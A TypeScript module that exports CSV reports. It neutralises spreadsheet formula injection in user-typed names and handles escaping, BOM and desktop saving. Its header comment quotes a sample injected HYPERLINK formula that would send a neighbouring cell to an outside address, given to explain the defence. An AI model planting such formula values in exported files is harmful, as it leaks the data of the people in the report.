import { isDesktop, saveTextFile } from './desktop'

/**
 * A leading `=`, `+`, `-`, `@`, tab or CR makes Excel read the cell as a
 * formula and run it when the report is opened. The names in these reports are
 * typed by providers and customers, not by us — a venue called
 * `=HYPERLINK("http://…"&A2,"اضغط")` turns an export into a live link that
 * leaks the row beside it.
 *
 * Prefixing an apostrophe is Excel's own way of saying "this is text". It is
 * stripped on display, so the cell still reads as the name that was typed.
 *
 * **Numbers are never prefixed, and that is the point of the type check.**
 * They come from our own code, and `-500` behind an apostrophe stops being a
 * number: the column no longer sums, and a report of refunds quietly totals
 * zero. The hole is in text the platform did not write; that is all this
 * closes.
 */
const FORMULA_START = /^[=+\-@\t\r]/

function neutralise(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return ''
  if (typeof value === 'number') return String(value)
  return FORMULA_START.test(value) ? `'${value}` : value
}

/** Wraps a cell in quotes when it contains a delimiter, quote or newline. */
function escapeCell(value: string | number | null | undefined): string {
  const text = neutralise(value)
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
}

export interface CsvTable {
  columns: string[]
  rows: (string | number | null | undefined)[][]
}

/**
 * Serialises the table to CSV text.
 *
 * Exported for `test/csv.test.ts`: the saving half runs through the browser or
 * the desktop Save dialog, neither of which is ours to measure — but the text
 * that lands in the file is, and it is where a stray comma breaks a report.
 *
 * The leading BOM is what makes Excel read the file as UTF-8; without it Arabic
 * column headers and names arrive as mojibake. CRLF line endings are what Excel
 * expects on every platform.
 */
export function serialise(table: CsvTable): string {
  const lines = [table.columns, ...table.rows].map((row) => row.map(escapeCell).join(','))
  return '﻿' + lines.join('\r\n')
}

/**
 * Saves a CSV report — as a browser download on the web, and through the
 * system's Save dialog in the desktop app.
 *
 * The two are not cosmetic variants of each other. `<a download>` is a browser
 * affordance: inside a desktop webview it either lands in a folder the user
 * never chose or does nothing at all, silently. So the desktop branch asks
 * where to put the file, the way every other program on the machine does.
 *
 * Returns `false` only when the user dismissed the Save dialog — a decision,
 * not a failure, and the caller must not report it as one.
 */
export async function downloadCsv(filename: string, table: CsvTable): Promise<boolean> {
  const name = filename.endsWith('.csv') ? filename : `${filename}.csv`
  const text = serialise(table)

  if (isDesktop) {
    return saveTextFile(name, text, { name: 'ملف CSV', extensions: ['csv'] })
  }

  const blob = new Blob([text], { type: 'text/csv;charset=utf-8;' })
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = name
  document.body.appendChild(link)
  link.click()
  link.remove()
  // Revoking synchronously races the browser's read of the blob and can cost the
  // download its filename, so hand the URL back on the next tick instead.
  setTimeout(() => URL.revokeObjectURL(url), 0)
  return true
}

/** `تقرير-المستخدمين-2026-08-11.csv` */
export function stampedFilename(prefix: string): string {
  return `${prefix}-${new Date().toISOString().slice(0, 10)}.csv`
}
